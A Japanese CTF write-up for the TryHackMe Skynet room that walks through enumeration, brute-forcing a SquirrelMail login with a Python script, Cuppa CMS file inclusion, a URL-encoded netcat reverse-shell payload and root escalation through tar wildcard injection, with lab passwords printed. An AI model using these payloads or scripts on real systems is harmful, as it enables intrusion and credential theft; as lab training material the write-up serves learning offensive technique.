# Skynet CTF

https://tryhackme.com/room/skynet

## Enumeration

### ポートスキャン

```shell
TARGET=10.10.212.211
root@ip-10-10-34-33:~# sudo nmap -sS -p- $TARGET
Starting Nmap 7.80 ( https://nmap.org ) at 2025-02-24 00:13 GMT
Nmap scan report for 10.10.212.211
Host is up (0.0018s latency).
Not shown: 65529 closed ports
PORT    STATE SERVICE
22/tcp  open  ssh
80/tcp  open  http
110/tcp open  pop3
139/tcp open  netbios-ssn
143/tcp open  imap
445/tcp open  microsoft-ds
MAC Address: 02:78:CF:12:C1:4D (Unknown)

root@ip-10-10-34-33:~# sudo nmap -sV -p22,80,110,139,143,445 $TARGET
Starting Nmap 7.80 ( https://nmap.org ) at 2025-02-24 00:14 GMT
Nmap scan report for 10.10.212.211
Host is up (0.00027s latency).

PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
80/tcp  open  http        Apache httpd 2.4.18 ((Ubuntu))
110/tcp open  pop3        Dovecot pop3d
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
143/tcp open  imap        Dovecot imapd
445/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
MAC Address: 02:78:CF:12:C1:4D (Unknown)
Service Info: Host: SKYNET; OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

### gobuster

```shell
root@ip-10-10-34-33:~# gobuster dir -x=txt,php -u http://$TARGET -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 30
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.212.211
[+] Method:                  GET
[+] Threads:                 30
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              txt,php
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.php                 (Status: 403) [Size: 278]
/admin                (Status: 301) [Size: 314] [--> http://10.10.212.211/admin/]
/css                  (Status: 301) [Size: 312] [--> http://10.10.212.211/css/]
/js                   (Status: 301) [Size: 311] [--> http://10.10.212.211/js/]
/config               (Status: 301) [Size: 315] [--> http://10.10.212.211/config/]
/ai                   (Status: 301) [Size: 311] [--> http://10.10.212.211/ai/]
/squirrelmail         (Status: 301) [Size: 321] [--> http://10.10.212.211/squirrelmail/]
/server-status        (Status: 403) [Size: 278]
Progress: 654825 / 654828 (100.00%)
===============================================================
Finished
===============================================================
```

## /squirrelmail

ログイン画面が表示された。

```text
SquirrelMail version 1.4.23 [SVN]
```

```shell
$ searchsploit SquirrelMail
---------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                    |  Path
---------------------------------------------------------------------------------- ---------------------------------
SquirrelMail - 'chpasswd' Local Buffer Overflow                                   | linux/local/273.c
SquirrelMail - 'chpasswd' Local Privilege Escalation (Brute Force)                | linux/local/417.c
Squirrelmail 1.4.x - 'Redirect.php' Local File Inclusion                          | php/webapps/27948.txt
SquirrelMail 1.4.x - Folder Name Cross-Site Scripting                             | php/webapps/24068.txt
SquirrelMail 1.x - Email Header HTML Injection                                    | linux/remote/24160.txt
SquirrelMail G/PGP Encryption Plugin - 'deletekey()' Command Injection            | php/webapps/4718.rb
SquirrelMail G/PGP Encryption Plugin 2.0 - Command Execution                      | php/webapps/4173.txt
SquirrelMail G/PGP Encryption Plugin 2.0/2.1 - Access Validation / Input Validati | php/webapps/30859.txt
SquirrelMail G/PGP Encryption Plugin 2.0/2.1 - Multiple Remote Command Execution  | php/webapps/30283.txt
SquirrelMail PGP Plugin - Command Execution (SMTP) (Metasploit)                   | linux/remote/16888.rb
SquirrelMail Virtual Keyboard Plugin - 'vkeyboard.php' Cross-Site Scripting       | php/webapps/34814.txt
---------------------------------------------------------------------------------- ---------------------------------
```

## SMB
```shell
$ smbclient -L //10.10.212.211 -U ""
Password for [WORKGROUP\]:

        Sharename       Type      Comment
        ---------       ----      -------
        print$          Disk      Printer Drivers
        anonymous       Disk      Skynet Anonymous Share
        milesdyson      Disk      Miles Dyson Personal Share
        IPC$            IPC       IPC Service (skynet server (Samba, Ubuntu))
Reconnecting with SMB1 for workgroup listing.

        Server               Comment
        ---------            -------

        Workgroup            Master
        ---------            -------
        WORKGROUP            SKYNET
```

anonymous共有がある。

```shell
$ smbclient //10.10.212.211/anonymous -U ""

smb: \> l
  .                                   D        0  Thu Nov 26 11:04:00 2020
  ..                                  D        0  Tue Sep 17 03:20:17 2019
  attention.txt                       N      163  Tue Sep 17 23:04:59 2019
  logs                                D        0  Wed Sep 18 00:42:16 2019
```

attention.txt と ログファイルをダウンロード


```shell
$ cat attention.txt                                      
A recent system malfunction has caused various passwords to be changed. All skynet employees are required to change their password after seeing this.
-Miles Dyson

$ cat log1.txt     
cyborg007haloterminator
terminator22596
terminator219
terminator20
terminator1989
terminator1988
terminator168
terminator16
terminator143
terminator13
terminator123!@#
terminator1056
terminator101
terminator10
terminator02
terminator00
roboterminator
pongterminator
manasturcaluterminator
exterminator95
exterminator200
dterminator
djxterminator
dexterminator
determinator
cyborg007haloterminator
avsterminator
alonsoterminator
Walterminator
79terminator6
1996terminator
```

パスワードリストのようなものがある。メールのログイン画面に使う。

```python
import requests

# 固定のユーザー名
USERNAME = "Miles"
# パスワードリストのファイルパス
PASSWORD_FILE = "pw.txt"
# ログインページとリダイレクトURL
LOGIN_URL = "http://10.10.212.211/squirrelmail/src/login.php"
REDIRECT_URL = "http://10.10.212.211/squirrelmail/src/redirect.php"

# セッションを作成
session = requests.Session()

# 初回GETリクエスト（Set-Cookieの取得）
response = session.get(LOGIN_URL)
cookies = session.cookies.get_dict()

# パスワードリストを1行ずつ処理
with open(PASSWORD_FILE, "r") as f:
    for password in f:
        password = password.strip()
        
        # POSTデータの作成
        data = {
            "login_username": USERNAME,
            "secretkey": password,
            "js_autodetect_results": "1",
            "just_logged_in": "1"
        }
        
        # ログイン試行
        response = session.post(REDIRECT_URL, data=data, cookies=cookies)
        
        # 応答の判定
        if "Unknown user or password incorrect" not in response.text:
            print(f"[+] 成功: パスワードは {password}")
            break
        else:
            print(f"[-] 失敗: {password}")

```

```shell
$ python ./login.py
[-] 失敗: cyborg007haloterminator
[-] 失敗: terminator22596
[-] 失敗: terminator219
[-] 失敗: terminator20
[-] 失敗: terminator1989
[-] 失敗: terminator1988
[-] 失敗: terminator168
[-] 失敗: terminator16
[-] 失敗: terminator143
[-] 失敗: terminator13
[-] 失敗: terminator123!@#
[-] 失敗: terminator1056
[-] 失敗: terminator101
[-] 失敗: terminator10
[-] 失敗: terminator02
[-] 失敗: terminator00
[-] 失敗: roboterminator
[-] 失敗: pongterminator
[-] 失敗: manasturcaluterminator
[-] 失敗: exterminator95
[-] 失敗: exterminator200
[-] 失敗: dterminator
[-] 失敗: djxterminator
[-] 失敗: dexterminator
[-] 失敗: determinator
[-] 失敗: cyborg007haloterminator
[-] 失敗: avsterminator
[-] 失敗: alonsoterminator
[-] 失敗: Walterminator
[-] 失敗: 79terminator6
[-] 失敗: 1996terminator
```
ヒットしなかった。

USERNAME = "milesdyson"

にしたらヒットした。

```shell
$ python ./login.py
[+] 成功: パスワードは cyborg007haloterminator
```

### メール

#### メール１

何かのパスワード。

```text
We have changed your smb password after system malfunction.
Password: )s{A&2Z=F^n_E.B`
```

#### メール２
```text
01100010 01100001 01101100 01101100 01110011 00100000 01101000 01100001 01110110
01100101 00100000 01111010 01100101 01110010 01101111 00100000 01110100 01101111
00100000 01101101 01100101 00100000 01110100 01101111 00100000 01101101 01100101
00100000 01110100 01101111 00100000 01101101 01100101 00100000 01110100 01101111
00100000 01101101 01100101 00100000 01110100 01101111 00100000 01101101 01100101
00100000 01110100 01101111 00100000 01101101 01100101 00100000 01110100 01101111
00100000 01101101 01100101 00100000 01110100 01101111 00100000 01101101 01100101
00100000 01110100 01101111
```

二進数をASCIIとして解釈すると、
```
balls have zero to me to me to me to me to me to me to me to me to
```

#### メール３

まったく意味不明。

```text
i can i i everything else . . . . . . . . . . . . . .
balls have zero to me to me to me to me to me to me to me to me to
you i everything else . . . . . . . . . . . . . .
balls have a ball to me to me to me to me to me to me to me
i i can i i i everything else . . . . . . . . . . . . . .
balls have a ball to me to me to me to me to me to me to me
i . . . . . . . . . . . . . . . . . . .
balls have zero to me to me to me to me to me to me to me to me to
you i i i i i everything else . . . . . . . . . . . . . .
balls have 0 to me to me to me to me to me to me to me to me to
you i i i everything else . . . . . . . . . . . . . .
balls have zero to me to me to me to me to me to me to me to me to
```

### SMB

パスワードを使ってSMBログインできた。

```shell
$ smbclient //10.10.212.211/milesdyson -U "milesdyson"
Password for [WORKGROUP\milesdyson]:
Try "help" to get a list of possible commands.
smb: \> 
```

important.txt

```text
$ cat important.txt                                                                         

1. Add features to beta CMS /45kra24zxs28v3yd
2. Work on T-800 Model 101 blueprints
3. Spend more time with my wife
```

### /45kra24zxs28v3yd

```shell
root@ip-10-10-39-254:~# gobuster dir -x=txt,php -u http://10.10.212.211/45kra24zxs28v3yd -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 30
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.212.211/45kra24zxs28v3yd
[+] Method:                  GET
[+] Threads:                 30
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              txt,php
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.php                 (Status: 403) [Size: 278]
/administrator        (Status: 301) [Size: 339] [--> http://10.10.212.211/45kra24zxs28v3yd/administrator/]
Progress: 654825 / 654828 (100.00%)
===============================================================
Finished
===============================================================
```

/45kra24zxs28v3yd/administrator で、Cuppa CMS のログイン画面。

```shell
$ searchsploit cuppa                
--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                                                                           |  Path
--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Cuppa CMS - '/alertConfigField.php' Local/Remote File Inclusion                                                                                                                                          | php/webapps/25971.txt
--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```

### ファイルインクルージョン

http://10.10.212.211/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=../../../../../../../../../etc/passwd

```shell

Field configuration:
root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/usr/sbin/nologin man:x:6:12:man:/var/cache/man:/usr/sbin/nologin lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin mail:x:8:8:mail:/var/mail:/usr/sbin/nologin news:x:9:9:news:/var/spool/news:/usr/sbin/nologin uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin proxy:x:13:13:proxy:/bin:/usr/sbin/nologin www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin backup:x:34:34:backup:/var/backups:/usr/sbin/nologin list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false syslog:x:104:108::/home/syslog:/bin/false _apt:x:105:65534::/nonexistent:/bin/false lxd:x:106:65534::/var/lib/lxd/:/bin/false messagebus:x:107:111::/var/run/dbus:/bin/false uuidd:x:108:112::/run/uuidd:/bin/false dnsmasq:x:109:65534:dnsmasq,,,:/var/lib/misc:/bin/false sshd:x:110:65534::/var/run/sshd:/usr/sbin/nologin milesdyson:x:1001:1001:,,,:/home/milesdyson:/bin/bash dovecot:x:111:119:Dovecot mail server,,,:/usr/lib/dovecot:/bin/false dovenull:x:112:120:Dovecot login user,,,:/nonexistent:/bin/false postfix:x:113:121::/var/spool/postfix:/bin/false mysql:x:114:123:MySQL Server,,,:/nonexistent:/bin/false
```

http://10.10.212.211/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=php://filter/convert.base64-encode/resource=../Configuration.php

base64 -d
```php
<?php 
        class Configuration{
                public $host = "localhost";
                public $db = "cuppa";
                public $user = "root";
                public $password = "password123";
                public $table_prefix = "cu_";
                public $administrator_template = "default";
                public $list_limit = 25;
                public $token = "OBqIPqlFWf3X";
                public $allowed_extensions = "*.bmp; *.csv; *.doc; *.gif; *.ico; *.jpg; *.jpeg; *.odg; *.odp; *.ods; *.odt; *.pdf; *.png; *.ppt; *.swf; *.txt; *.xcf; *.xls; *.docx; *.xlsx";
                public $upload_default_path = "media/uploadsFiles";
                public $maximum_file_size = "5242880";
                public $secure_login = 0;
                public $secure_login_value = "";
                public $secure_login_redirect = "";
        } 
?> 
```

### RCE

URL
```text
http://10.10.212.211/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=data://text/plain,%3C?=`$_GET[0]`?%3E&0=%72%6d%20%2f%74%6d%70%2f%66%3b%6d%6b%66%69%66%6f%20%2f%74%6d%70%2f%66%3b%63%61%74%20%2f%74%6d%70%2f%66%7c%73%68%20%2d%69%20%32%3e%26%31%7c%6e%63%20%31%30%2e%32%2e%32%32%2e%31%38%32%20%38%38%38%38%20%3e%2f%74%6d%70%2f%66
```

Listen
```shell
$ nc -nvlp 8888
listening on [any] 8888 ...
connect to [10.2.22.182] from (UNKNOWN) [10.10.212.211] 36742
sh: 0: can't access tty; job control turned off
$ whoami
www-data
```
リバースシェル取得

```shell
$ cat /home/milesdyson/user.txt
7ce5.............
```

ユーザーフラグゲット


## 権限昇格

```shell
$ ls -al backups
total 4584
drwxr-xr-x 2 root       root          4096 Sep 17  2019 .
drwxr-xr-x 5 milesdyson milesdyson    4096 Sep 17  2019 ..
-rwxr-xr-x 1 root       root            74 Sep 17  2019 backup.sh
-rw-r--r-- 1 root       root       4679680 Feb 23 22:29 backup.tgz

$ cat backups/backup.sh
#!/bin/bash
cd /var/www/html
tar cf /home/milesdyson/backups/backup.tgz *

$ cat /etc/crontab
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user  command
*/1 *   * * *   root    /home/milesdyson/backups/backup.sh
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
```

- 毎分、/home/milesdyson/backups/backup.sh が自動的に実行される
- /var/www/html が /home/milesdyson/backups/backup.tgz に保存される


```shell
$ ls -al /var/www/html
total 68
drwxr-xr-x 8 www-data www-data  4096 Nov 26  2020 .
drwxr-xr-x 3 root     root      4096 Sep 17  2019 ..
drwxr-xr-x 3 www-data www-data  4096 Sep 17  2019 45kra24zxs28v3yd
drwxr-xr-x 2 www-data www-data  4096 Sep 17  2019 admin
drwxr-xr-x 3 www-data www-data  4096 Sep 17  2019 ai
drwxr-xr-x 2 www-data www-data  4096 Sep 17  2019 config
drwxr-xr-x 2 www-data www-data  4096 Sep 17  2019 css
-rw-r--r-- 1 www-data www-data 25015 Sep 17  2019 image.png
-rw-r--r-- 1 www-data www-data   523 Sep 17  2019 index.html
drwxr-xr-x 2 www-data www-data  4096 Sep 17  2019 js
-rw-r--r-- 1 www-data www-data  2667 Sep 17  2019 style.css
```

/var/www/html の所有者は www-data だから、/root/root.txt へのリンクを作れるのではないか？

```shell
$ ln -s /root/root.txt /var/www/html 

$ ls -al /var/www/html
total 68
drwxr-xr-x 8 www-data www-data  4096 Feb 23 22:35 .
drwxr-xr-x 3 root     root      4096 Sep 17  2019 ..
drwxr-xr-x 3 www-data www-data  4096 Sep 17  2019 45kra24zxs28v3yd
drwxr-xr-x 2 www-data www-data  4096 Sep 17  2019 admin
drwxr-xr-x 3 www-data www-data  4096 Sep 17  2019 ai
drwxr-xr-x 2 www-data www-data  4096 Sep 17  2019 config
drwxr-xr-x 2 www-data www-data  4096 Sep 17  2019 css
-rw-r--r-- 1 www-data www-data 25015 Sep 17  2019 image.png
-rw-r--r-- 1 www-data www-data   523 Sep 17  2019 index.html
drwxr-xr-x 2 www-data www-data  4096 Sep 17  2019 js
lrwxrwxrwx 1 www-data www-data    14 Feb 23 22:35 root.txt -> /root/root.txt
-rw-r--r-- 1 www-data www-data  2667 Sep 17  2019 style.css
```

展開
```shell
$ tar -xvf ./backup.tgz

$ ls -al | grep root.txt
lrwxrwxrwx  1 www-data www-data      14 Feb 23 22:35 root.txt -> /root/root.txt
```

ファイルではなくリンクとしてアーカイブされたので読めなかった。

```text
tar cf -h
```
ならファイルそのものがアーカイブされるらしいが、今回は使えない。

### tar cf xxx * の脆弱性

https://tryhackme.com/resources/blog/skynet-writeup

```shell
$ cd /var/www/html
$ echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.2.22.182 8889 >/tmp/f" > shell.sh
$ touch "/var/www/html/--checkpoint-action=exec=sh shell.sh"
$ touch "/var/www/html/--checkpoint=1"

$ ls -al
total 72
-rw-r--r-- 1 www-data www-data     0 Feb 23 23:16 --checkpoint-action=exec=sh shell.sh
-rw-r--r-- 1 www-data www-data     0 Feb 23 23:16 --checkpoint=1
drwxr-xr-x 8 www-data www-data  4096 Feb 23 23:16 .
drwxr-xr-x 3 root     root      4096 Sep 17  2019 ..
drwxr-xr-x 3 www-data www-data  4096 Sep 17  2019 45kra24zxs28v3yd
drwxr-xr-x 2 www-data www-data  4096 Sep 17  2019 admin
drwxr-xr-x 3 www-data www-data  4096 Sep 17  2019 ai
drwxr-xr-x 2 www-data www-data  4096 Sep 17  2019 config
drwxr-xr-x 2 www-data www-data  4096 Sep 17  2019 css
-rw-r--r-- 1 www-data www-data 25015 Sep 17  2019 image.png
-rw-r--r-- 1 www-data www-data   523 Sep 17  2019 index.html
drwxr-xr-x 2 www-data www-data  4096 Sep 17  2019 js
-rw-r--r-- 1 www-data www-data    79 Feb 23 23:15 shell.sh
-rw-r--r-- 1 www-data www-data  2667 Sep 17  2019 style.css
```

仕組み

```text
shell.sh
--checkpoint-action=exec=sh shell.sh
--checkpoint=1

の3ファイルを /var/www/html に作成している。shell.sh の中身は普通のリバースシェル。

tar cf /home/milesdyson/backups/backup.tgz *

という形でワイルドカードを使用しているため、tarコマンドは
--checkpoint-action=exec=sh --checkpoint=1
の部分を、コマンドオプションとして誤認するという理屈。
```

Listen
```shell
$ nc -nvlp 8889 
listening on [any] 8889 ...
connect to [10.2.22.182] from (UNKNOWN) [10.10.104.19] 60970
/bin/sh: 0: can't access tty; job control turned off
# whoami
root
# cat /root/root.txt
3f0.......................
```

ルートフラグゲット。

## 振り返り

- 権限昇格の脆弱性は目から鱗。応用範囲も広そうで大きな収穫。
- メールの謎の文面は最後まで謎のままだった。たぶん映画に元ネタがあるのだろう。
